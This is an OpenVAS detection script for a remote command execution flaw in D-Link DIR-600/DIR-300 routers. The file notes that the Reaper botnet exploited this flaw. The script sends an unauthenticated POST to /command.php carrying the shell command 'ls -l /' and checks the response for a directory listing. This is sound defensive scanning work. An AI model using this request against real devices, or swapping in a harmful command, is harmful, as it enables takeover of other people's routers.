###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_rce_02_2013.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# D-Link DIR-600/DIR 300 Remote Code Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103656");
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("D-Link DIR-600/DIR 300 Remote Code Execution Vulnerabilities");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120052/D-Link-DIR-600-DIR-300-Command-Execution-Bypass-Disclosure.html");
  script_xref(name:"URL", value:"http://www.s3cur1ty.de/m1adv2013-003");
  script_xref(name:"URL", value:"http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-02-05 16:00:07 +0100 (Tue, 05 Feb 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("DIR-6_3_00/banner");
  script_tag(name:"solution", value:"Vendor updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"D-Link DIR-600 and DIR 300 products are prone to a remote code-
execution vulnerability.

This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017.");
  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary code in
the context of the affected application. Failed exploit attempts may
result in a denial-of-service condition.");
  script_tag(name:"affected", value:"The following products are affected:

DIR-300:

Firmware Version : 2.12 - 18.01.2012

Firmware Version : 2.13 - 07.11.2012

DIR-600:

Firmware-Version : 2.12b02 - 17/01/2012

Firmware-Version : 2.13b01 - 07/11/2012

Firmware-Version : 2.14b01 - 22/01/2013");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || ("DIR-300" >!< banner && "DIR-600" >!< banner))exit(0);

host = http_host_name(port:port);
ex = 'cmd=ls -l /;';
len = strlen(ex);

req = string("POST /command.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
             "Referer: http://",host,"/\r\n",
             "Content-Length: ", len,"\r\n",
             "Cookie: uid=openvas\r\n",
             "\r\n",
             ex);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("www" >< result && "sbin" >< result && "var" >< result && "drwxrwxr-x" >< result) {
  security_message(port:port);
  exit(0);
}

exit(0);
